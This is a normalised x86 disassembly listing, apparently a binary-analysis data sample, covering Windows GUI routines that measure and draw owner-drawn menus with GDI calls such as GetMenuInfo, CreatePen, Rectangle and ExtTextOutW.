mov ecx [ edi + 0x4 ]
add esp 0x4
mov [ ecx + 0x19 ] 0x1
mov [ ebp - 0x4 ] 0x5
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
lea edi [ esi + 0x40 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call eax
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x7
mov [ esi + 0x14 ] ebx
mov [ esi + 0xc ] 0x101
mov [ esi + 0x3c ] ebx
mov [ esi + 0x38 ] 0x100
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0x44 ] ebx
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41b930
push ebp
mov ebp esp
push 0xffffffff
push sub_446ca2
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax edi
call sub_41eaf0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edi + 0x4 ]
push eax
call [ operator delete@IAT ]
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_41b9a0
push ebp
mov ebp esp
push 0xffffffff
push sub_447db2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x3
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov cl 0x2
mov [ ebp - 0x4 ] cl
lea eax [ edi + 0x40 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov eax [ edi + 0x10 ]
push eax
call [ DeleteObject@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea ebx [ edi + 0x28 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] 0x6
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x14 ]
mov eax ebx
call sub_41eaf0
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebx + 0x4 ]
push ebx
call [ operator delete@IAT ]
add esp 0x4
mov [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x1c ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov eax [ esi ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ edi + 0x10 ] 0x0
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edi + 0x10 ]
cmp eax ebx
je r-xdata
push eax
call [ free@IAT ]
add esp 0x4
mov [ esi ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call [ DeleteObject@IAT ]
test eax eax
je r-xdata
mov [ edi + 0x10 ] ebx
sub_41bab0
push ebp
mov ebp esp
push 0xffffffff
push sub_44516a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov ecx [ ebx + 0x4 ]
xor eax eax
mov [ ebp - 0x14 ] ecx
mov ecx [ ebx ]
mov [ ebp - 0x18 ] eax
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x34 ]
push edx
mov [ ebp - 0x30 ] eax
push ecx
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x34 ] 0x1c
mov [ ebp - 0x30 ] 0x8
call [ GetMenuInfo@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov edx [ ebp + 0x14 ]
test edx edx
je r-xdata
xor edx edx
cmp [ eax + 0x39 ] dl
sete dl
lea edx [ edx * 8 + 0x18 ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x5 ] 0x0
mov eax [ ebp + 0x8 ]
sete cl
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp + 0x18 ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov ebx [ ebx ]
mov [ ebp - 0x4 ] 0x1
push ebx
call [ GetMenuItemCount@IAT ]
dec eax
cmp [ ebp - 0x14 ] eax
jne r-xdata
movzx esi [ eax + 0x39 ]
neg esi
sbb esi esi
and esi 0xfffffffb
add esi 0x9
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov ebx [ ebp - 0x18 ]
mov [ eax ] ebx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x5 ] 0x0
sete al
test al al
je r-xdata
test edx edx
je r-xdata
mov [ eax ] 0x0
mov edx [ ebp + 0x8 ]
movzx edi [ edx + 0x39 ]
mov ecx [ ebp + 0x8 ]
movzx edi [ ecx + 0x39 ]
jmp r-xdata
test ecx ecx
je r-xdata
mov [ edx ] esi
neg edi
sbb edi edi
and edi 0xfffffffb
add edi 0x9
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov [ ecx ] edi
sub_41bc10
push ebp
mov ebp esp
push 0xffffffff
push sub_445145
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
xor eax eax
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x28 ]
push edx
mov [ ebp - 0x24 ] eax
push ecx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x28 ] 0x1c
mov [ ebp - 0x24 ] 0x8
call [ GetMenuInfo@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov dl [ eax + 0x39 ]
xor ecx ecx
test dl dl
sete cl
movzx eax dl
neg eax
sbb eax eax
and eax 0xfffffffd
lea edi [ ecx + ecx + 0x3 ]
movzx ecx dl
add eax 0x10
neg ecx
sbb ecx ecx
and ecx 0xfffffffd
add ecx 0x5
test esi esi
je r-xdata
test ebx ebx
je r-xdata
movzx edx dl
neg edx
sbb edx edx
and edx 0xa
mov [ esi ] edx
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov [ ebx ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov [ eax ] edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn 0x10
mov [ eax ] ecx
sub_41bce0
push ebp
mov ebp esp
push 0xffffffff
push sub_44601f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x14 ]
test [ esi + 0xc ] 0x800
mov [ ebp - 0x14 ] esi
je r-xdata
xor ebx ebx
mov [ ebp - 0xe ] 0x1
mov [ ebp - 0xd ] 0x1
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x4 ] ebx
push ebx
mov [ ebp - 0x30 ] ebx
call [ GetWindowDC@IAT ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x10 ]
mov edi [ esi + 0x8 ]
push ecx
lea edx [ ebp - 0xf ]
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0xf ] bl
push edx
lea ebx [ ebp - 0x44 ]
mov esi eax
call sub_41b740
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov ebx [ ebp - 0x3c ]
mov esi [ ebp - 0x38 ]
mov edx [ eax + 0x1c ]
sub ebx [ ebp - 0x44 ]
sub esi [ ebp - 0x40 ]
mov ecx edi
call edx
test eax eax
je r-xdata
mov edi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0xe ] al
mov [ ebp - 0xd ] al
mov [ ecx + 0x10 ] 0x8
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x10 ] esi
add ebx [ edi + 0x14 ]
push 0x47
call [ GetSystemMetrics@IAT ]
mov ecx 0x1
sub ecx eax
mov eax [ edi + 0x3c ]
add ebx ecx
test eax eax
je r-xdata
cmp esi eax
jge r-xdata
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push esi
push edi
lea ebx [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
call sub_41bc10
mov esi [ ebp - 0x14 ]
lea ecx [ ebp - 0x24 ]
push ecx
lea edx [ ebp - 0x28 ]
push edx
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp + 0x8 ]
xor ebx ebx
push ecx
push edi
mov ecx esi
mov [ ebp + 0x8 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
call sub_41bab0
mov esi [ esi ]
mov [ ebp - 0x4 ] 0x3
xor eax eax
lea edx [ ebp - 0x50 ]
push edx
mov [ ebp - 0x4c ] eax
push esi
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x50 ] 0x1c
mov [ ebp - 0x4c ] 0x8
call [ GetMenuInfo@IAT ]
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ edx + 0x18 ]
mov ecx edi
call eax
test eax eax
je r-xdata
cmp ebx eax
jle r-xdata
mov esi eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0xffffffff
cmp eax ebx
je r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx + 0xc ] ebx
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x34 ]
push eax
push 0x0
mov [ ebp - 0x34 ] 0x0
call [ ReleaseDC@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x14 ]
xor eax eax
cmp ebx eax
jge r-xdata
mov ebx eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x18 ]
add ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x20 ]
add ecx [ ebp - 0x1c ]
lea ecx [ ecx + eax + 0x2 ]
mov eax [ ebp + 0xc ]
add [ eax + 0xc ] ecx
mov ecx [ eax + 0xc ]
cmp dl bl
je r-xdata
xor dl dl
mov dl [ eax + 0x4 ]
jmp r-xdata
mov ebx eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x28 ]
mov edi [ ebp - 0x24 ]
lea esi [ edi + ecx ]
add esi [ ebp - 0x2c ]
add esi [ ebp - 0x30 ]
add [ eax + 0x10 ] esi
mov esi [ eax + 0x10 ]
cmp ecx ebx
je r-xdata
cmp [ ebp - 0xe ] bl
je r-xdata
cmp ecx 0x9c
jae r-xdata
cmp [ ebp - 0xd ] bl
je r-xdata
cmp edi ebx
je r-xdata
xor ecx ecx
cmp dl bl
sete cl
lea edx [ ecx + esi - 0x3 ]
mov [ eax + 0x10 ] edx
mov [ eax + 0xc ] ecx
jmp r-xdata
mov ecx 0x9c
add [ eax + 0x10 ] 0xfffffffe
sub_41bf30
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x2c ] ecx
movzx ecx [ edi + 0x38 ]
push ebx
push esi
mov [ ebp - 0x30 ] eax
mov eax [ edi ]
mov [ ebp - 0x3c ] edx
mov edx [ eax + 0x4 ]
push ecx
mov ecx edi
call edx
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x8 ]
pop esi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
lea ecx [ esi + 0xb0 ]
lea ebx [ ebp - 0x38 ]
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x38 ] 0x2
call sub_414260
mov eax [ ebp - 0x34 ]
cmp eax [ esi + 0xb4 ]
je r-xdata
mov esi [ eax + 0x10 ]
xor ebx ebx
cmp esi ebx
je r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
mov edx [ esi ]
mov edx [ edx + 0xc ]
mov [ ebp - 0x20 ] eax
mov eax [ esi + 0x14 ]
mov [ ebp - 0x1c ] ecx
push eax
mov ecx esi
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
call edx
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov ebx [ esi + 0x10 ]
push ecx
mov ecx esi
call edx
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
sub eax ecx
sub eax ebx
cdq
sub eax edx
sar eax 0x1
add eax ecx
movzx ecx [ edi + 0x39 ]
mov [ ebp - 0x14 ] eax
add eax ebx
neg ecx
sbb ecx ecx
and ecx 0xc
add ecx 0xd
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x2c ]
add ecx [ eax ]
mov edx [ eax + 0x8 ]
mov eax [ esi ]
mov [ ebp - 0x18 ] ecx
sub edx 0xd
push 0x0
mov [ ebp - 0x10 ] edx
lea ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x30 ]
lea edx [ ebp - 0x18 ]
push edx
mov edx [ eax + 0x18 ]
push ecx
mov ecx esi
call edx
sub_41c040
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ecx ]
mov edx [ edx + 0x4 ]
push ebx
mov [ ebp - 0x28 ] eax
movzx eax [ ecx + 0x38 ]
push esi
push eax
call edx
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
lea ecx [ esi + 0xb0 ]
lea ebx [ ebp - 0x30 ]
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x30 ] 0x1
call sub_414260
mov eax [ ebp - 0x2c ]
cmp eax [ esi + 0xb4 ]
je r-xdata
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
xor ebx ebx
cmp [ ebp + 0xc ] bl
push ecx
mov ecx esi
setne bl
call edx
mov eax [ esi + 0xc ]
cdq
sub eax edx
mov edx [ esi ]
mov edx [ edx + 0xc ]
sar eax 0x1
mov ecx eax
imul ecx ebx
mov [ ebp - 0x24 ] ecx
add ecx eax
mov eax [ esi + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0x14 ]
mov [ ebp - 0x1c ] ecx
push eax
mov ecx esi
mov [ ebp - 0x20 ] 0x0
call edx
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov ebx [ esi + 0x10 ]
push ecx
mov ecx esi
call edx
mov eax [ esi + 0xc ]
mov ecx [ edi + 0x8 ]
cdq
sub eax edx
sar eax 0x1
sub ecx eax
mov [ ebp - 0x14 ] ecx
add ecx eax
mov eax [ edi + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi + 0x4 ]
sub eax ecx
sub eax ebx
cdq
sub eax edx
sar eax 0x1
add eax ecx
push 0x1
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x24 ]
push ecx
mov ecx [ ebp - 0x28 ]
add eax ebx
lea edx [ ebp - 0x14 ]
push edx
mov [ ebp - 0x8 ] eax
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push ecx
mov ecx esi
call edx
sub_41c150
push ebp
mov ebp esp
push 0xffffffff
push sub_445fdd
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
movzx edx [ ecx + 0x38 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
push edx
call eax
mov eax [ eax + 0xd8 ]
xor ecx ecx
cmp eax ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x1
push eax
push 0x1
push ecx
call [ CreatePen@IAT ]
push eax
mov [ ebp - 0x10 ] eax
mov edi [ SelectObject@IAT ]
push esi
call edi
push 0x5
mov [ ebp - 0x14 ] eax
call [ GetStockObject@IAT ]
push eax
push esi
call edi
mov ecx [ ebx + 0xc ]
mov edx [ ebx + 0x8 ]
push ecx
mov ecx [ ebx ]
push edx
mov [ ebp - 0x18 ] eax
mov eax [ ebx + 0x4 ]
push eax
push ecx
push esi
call [ Rectangle@IAT ]
mov edx [ ebp - 0x14 ]
push edx
push esi
call edi
mov eax [ ebp - 0x18 ]
push eax
push esi
call edi
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call [ DeleteObject@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x10 ] 0x0
sub_41c220
push ebp
mov ebp esp
push 0xffffffff
push sub_446c65
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi edx
mov edx [ eax + 0x8 ]
mov ebx [ edx ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x4 ] 0x0
movzx ecx [ esi + 0x38 ]
mov eax [ esi ]
mov edx [ eax + 0x4 ]
push ecx
mov ecx esi
call edx
mov eax [ eax + 0xc4 ]
push eax
push ebx
call [ SetBkColor@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
movzx eax [ esi + 0x38 ]
mov edx [ esi ]
mov edx [ edx + 0x4 ]
push eax
mov ecx esi
call edx
mov esi eax
xor edi edi
lea ecx [ esi + 0xb0 ]
lea ebx [ ebp - 0x34 ]
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x34 ] edi
call sub_414260
mov esi [ esi + 0xb4 ]
mov eax [ ebp - 0x2c ]
cmp eax esi
je r-xdata
mov eax [ ebp - 0x28 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x2
push 0x0
push 0x0
push ebx
call [ ExtTextOutW@IAT ]
push edi
push ebx
call [ SetBkColor@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov esi [ eax + 0x10 ]
cmp esi edi
je r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x10 ]
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x1c ] ecx
push edi
lea ecx [ ebp - 0x24 ]
push ecx
mov ecx [ ebp - 0x30 ]
push edx
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
mov edx [ eax + 0x18 ]
push ecx
mov ecx esi
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] edi
call edx
sub_41c340
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov [ ebp - 0x3c ] eax
movzx eax [ ecx + 0x38 ]
mov [ ebp - 0x2c ] edx
mov edx [ ecx ]
mov edx [ edx + 0x4 ]
push edi
mov edi [ ebp + 0xc ]
push eax
call edx
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
lea ecx [ esi + 0xb0 ]
lea ebx [ ebp - 0x38 ]
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x38 ] 0x3
call sub_414260
mov eax [ ebp - 0x34 ]
cmp eax [ esi + 0xb4 ]
je r-xdata
mov esi [ eax + 0x10 ]
xor ebx ebx
cmp esi ebx
je r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov eax [ esi + 0xc ]
mov edx [ edi + 0x4 ]
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x20 ] eax
mov eax [ edi ]
mov [ ebp - 0x1c ] ecx
mov ecx [ edi + 0x8 ]
mov [ ebp - 0x14 ] edx
mov edx [ edi + 0xc ]
mov edi [ ebp - 0x3c ]
add eax 0x2
sub ecx 0x2
mov [ ebp - 0x18 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x10 ] ecx
mov ecx [ edx + 0x4 ]
sub eax 0x4
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x14 ] eax
cmp eax ecx
jg r-xdata
mov eax [ edi + 0xc ]
mov edx [ edx + 0xc ]
add eax 0x4
mov [ ebp - 0xc ] eax
cmp eax edx
jl r-xdata
mov [ ebp - 0x14 ] ecx
mov eax [ esi ]
push ebx
lea ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x30 ]
lea edx [ ebp - 0x18 ]
push edx
mov edx [ eax + 0x18 ]
push ecx
mov ecx esi
call edx
mov [ ebp - 0xc ] edx
sub_41c440
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x2c ] ecx
movzx ecx [ edi + 0x38 ]
mov [ ebp - 0x38 ] eax
mov eax [ edi ]
mov [ ebp - 0x3c ] edx
mov edx [ eax + 0x4 ]
push ecx
mov ecx edi
mov [ ebp - 0x30 ] edi
call edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
cmp [ ebp + 0x18 ] al
jne r-xdata
lea ecx [ esi + 0xb0 ]
lea ebx [ ebp - 0x28 ]
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x28 ] 0x4
call sub_414260
mov eax [ ebp - 0x34 ]
cmp eax [ esi + 0xb4 ]
je r-xdata
cmp ebx eax
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x18
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
cmp [ edi + 0xd ] al
je r-xdata
mov edx [ esi ]
mov eax [ esi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx esi
call edx
mov eax [ esi + 0xc ]
movzx ecx [ ebp + 0x1c ]
cdq
and edx 0x3
add eax edx
xor edx edx
sar eax 0x2
cmp [ ebp + 0x14 ] dl
setne dl
neg ecx
sbb ecx ecx
and ecx 0x2
add edx ecx
mov ecx [ esi + 0x10 ]
imul edx eax
xor edi edi
lea ebx [ edx + eax ]
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] ebx
cmp [ ebp + 0x14 ] al
je r-xdata
mov eax [ ebp - 0x30 ]
xor edx edx
cmp [ eax + 0x39 ] dl
mov eax [ ebp - 0x2c ]
mov eax [ eax ]
setne dl
dec edx
and edx 0xc
add eax edx
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x24 ] eax
test edx edx
jne r-xdata
mov eax 0x5
call sub_413ad0
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
mov eax 0x6
call sub_413ad0
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
sub ebx [ ebp - 0x14 ]
push 0x1
add ebx eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x1c ] ebx
mov ebx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
sub eax ebx
sub eax ecx
add eax edi
cdq
sub eax edx
sar eax 0x1
sub ecx edi
add eax ebx
add ecx eax
mov [ ebp - 0x18 ] ecx
lea ecx [ ebp - 0x14 ]
push ecx
mov ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x20 ] eax
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push ecx
mov ecx esi
call edx
mov edx [ ebp - 0x2c ]
mov eax [ edx + 0x8 ]
sub eax ebx
sub eax [ ebp - 0x28 ]
add eax [ ebp - 0x14 ]
cdq
sub eax edx
sar eax 0x1
add eax [ ebp - 0x28 ]
mov [ ebp - 0x24 ] eax
mov edi esi
call sub_41b320
mov edi [ ebp - 0x28 ]
push ebx
mov ebx eax
lea esi [ ebp - 0x24 ]
call sub_41f640
mov ecx [ eax ]
mov esi [ ebp - 0x28 ]
mov [ ebp - 0x14 ] ecx
mov edi [ eax + 0x4 ]
mov [ ebp - 0x10 ] edi
mov ebx [ eax + 0x8 ]
mov [ ebp - 0xc ] ebx
mov ecx [ eax + 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] ecx
test esi esi
je r-xdata
sub_41c630
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx edx
mov edx [ eax ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x14 ] edx
mov edx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ecx ]
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x10 ] edx
mov ecx [ eax - 0xc ]
mov [ ebp - 0x30 ] ecx
test ecx ecx
jg r-xdata
push 0x9
push eax
call [ wcschr@IAT ]
add esp 0x8
test eax eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x38 ]
sub eax [ ecx ]
sar eax 0x1
mov [ ebp - 0x2c ] 0xffffffff
mov eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x2c ] eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x30 ] eax
lea eax [ ecx + eax * 2 + 0x2 ]
mov [ ebp - 0x40 ] eax
mov edx [ ebp - 0x38 ]
mov ecx [ edx ]
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x40 ] 0x0
test eax eax
jle r-xdata
movzx ecx [ ebx + 0x38 ]
mov eax [ ebx ]
mov edx [ eax + 0x4 ]
push ecx
